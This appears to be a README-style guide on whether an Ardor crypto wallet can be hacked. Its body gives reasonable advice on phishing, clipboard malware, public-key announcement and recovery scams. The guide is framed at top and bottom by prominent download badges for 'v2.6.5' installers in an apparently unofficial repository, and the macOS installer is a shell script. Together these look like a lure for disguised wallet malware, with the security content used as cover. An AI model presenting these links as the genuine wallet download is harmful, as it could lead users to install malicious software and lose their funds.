![Ardor Wallet guide](assets/banner-article.png)

# Can an Ardor wallet be hacked? What actually happens

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

An Ardor wallet cannot be hacked in the way an exchange account can, because there is no server holding the keys and no password to guess. Coins disappear when a passphrase leaks, when malware gets a foothold, or when an account whose key was never published is seized by another secret that resolves to the same abbreviated address.

## Why there is no account to break into

The wallet derives an account from a secret you hold. Nothing about the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) exists on a server that could be breached, and the network accepts a transaction because it carries a valid signature, not because a login succeeded.

That removes the entire category of attacks that dominates custodial services: credential stuffing, database leaks, insider withdrawals, support-desk social engineering. It replaces them with a smaller and much more personal set, which is what the rest of this page is about.

## The four ways an account is actually emptied

| Vector | How it happens | What it looks like afterwards |
|---|---|---|
| Leaked secret | Typed into a phishing page, a fake wallet, a support chat or a screenshot | A single sweep of the full balance, often minutes after the leak |
| Compromised machine | Clipboard malware swaps the recipient address, or a keylogger captures the secret | A send you authorised, to an address you did not intend |
| Unannounced public key | An account that never sent a transaction is claimed by a different secret mapping to the same short ID | Funds moved without your wallet ever being opened |
| Lost backup, not theft | The written copy is wrong and the account is never opened again | Nothing moves; the balance sits there unreachable |

Only the third row looks like magic, and it has a documented explanation. The others are social or local, and every one of them is preventable without touching the protocol.

Note what is missing from that table: a flaw in the signature scheme, a break in the wallet's key handling, a compromised [release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md) asset. Those are the attacks people imagine, and they are the ones the design exists to resist. The rows above are the ones that actually happen, which is why the useful advice is behavioural rather than technical - and why an update cannot fix a leaked phrase.

## The public key problem, explained

An account that has never sent a transaction may not have its [Ardor public key](https://github.com/ardor-software/ardor-wallet-guides/blob/main/announce-a-public-key-in-ardor-wallet.md) recorded on the chain. The network then knows it by a shorter identifier, and a secret that collides with that shorter form could, in principle, act as the account.

Announcing the public key closes that gap: an outgoing transaction, or a receiving transaction that includes the recipient public key, records it on [chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md), after which only the true secret can sign. The step costs a single transaction and repays itself on any idle account, more so where the coins came across from a predecessor chain and the key was never published.

## Why hacked is usually the wrong word

Hacked suggests a break in the cryptography or the network. In practice the signature check does exactly what it should: it accepts transactions signed by the account's key, and the key was in someone else's hands because it was typed, photographed or captured.

Using the accurate word matters, because it points at the right defence. If the wallet had been broken, an update would fix it. Because the secret leaked, only better habits will.

## What an emptied account looks like

Typically a single transaction that moves everything, at a time you were not using the wallet, to an address you have never seen. There is no partial withdrawal, no gradual drain and no warning. A wallet that shows a zero balance after such a transaction is reporting the chain correctly.

Do not confuse that with the far more common zero-balance causes: a wrong chain selected, a light client reading a lagging node, or an unfinished sync. Those produce a zero with no outgoing transaction in the history, which is the detail that separates a display problem from a theft.

## If it happens to you

1. Do not reuse the secret. The account is compromised and will be emptied again if anything is sent to it.
2. Create a new account with a new secret on a machine you trust.
3. Move any remaining funds to it immediately, then investigate.
4. If the secret may have been typed into a website, assume it is public and treat the old account as closed.

Recovery is not available and no service can reverse a transaction. Anyone offering to do so, for a fee or for a share, is running the same scam that emptied the account.

Check the chain before you conclude the worst. If the history shows no outgoing transaction and the explorer agrees, the balance was never taken and the wallet is looking at the wrong chain or an unfinished sync. That distinction takes a minute and prevents a great deal of unnecessary panic.

## Prevention that actually works

Keep the secret offline and unphotographed. Verify recipient addresses on screen rather than trusting a clipboard. Announce public keys on idle accounts. Use a hardware device once the balance is worth the friction. And treat every unsolicited offer of help - recovery, migration, a bonus, a wallet check - as an attempt to obtain the secret.

## FAQ

### Can someone guess my passphrase?

Not a generated one. Twelve words from a dictionary of more than 1,600 entries is far beyond brute force. A phrase you invented yourself is a different matter and should be replaced.

### Is the wallet itself vulnerable to malware?

Malware on the machine can capture what you type or swap a clipboard address. That is a property of the computer, not the wallet, and a hardware device is the defence.

### Does announcing the public key cost anything?

It costs one transaction fee, because it is recorded by a transaction. It is the cheapest protection available for an account that has never sent.

### Can a transaction be reversed?

No. Once confirmed, it is final, which is why address checking and a small test send matter more here than in systems with chargebacks.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md)
- [Announce a public key in the Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/announce-a-public-key-in-ardor-wallet.md)
- [Spot a phishing wallet that asks for your passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/spot-a-phishing-ardor-wallet.md)
- [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
